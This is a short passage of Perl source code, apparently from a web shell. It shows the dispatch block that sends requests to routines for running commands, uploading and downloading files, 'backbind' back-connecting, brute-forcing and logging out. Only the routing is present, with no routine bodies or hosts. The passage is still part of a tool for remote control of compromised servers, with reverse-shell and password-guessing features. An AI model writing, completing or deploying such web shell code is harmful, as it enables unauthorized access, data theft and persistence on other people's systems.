		&ExecuteCommand;
	}
}
elsif($Action eq "upload") # user wants to upload a file
{
	&UploadFile;
}
elsif($Action eq "download") # user wants to download a file
{
	&DownloadFile;
}
elsif($Action eq "backbind") # user wants to backconnect
{
	&BackBind;
}
elsif($Action eq "bruteforcer") # user wants to backconnect
{
	&BruteForcer;
}
elsif($Action eq "logout") # user wants to logout
{
	&PerformLogout;
}

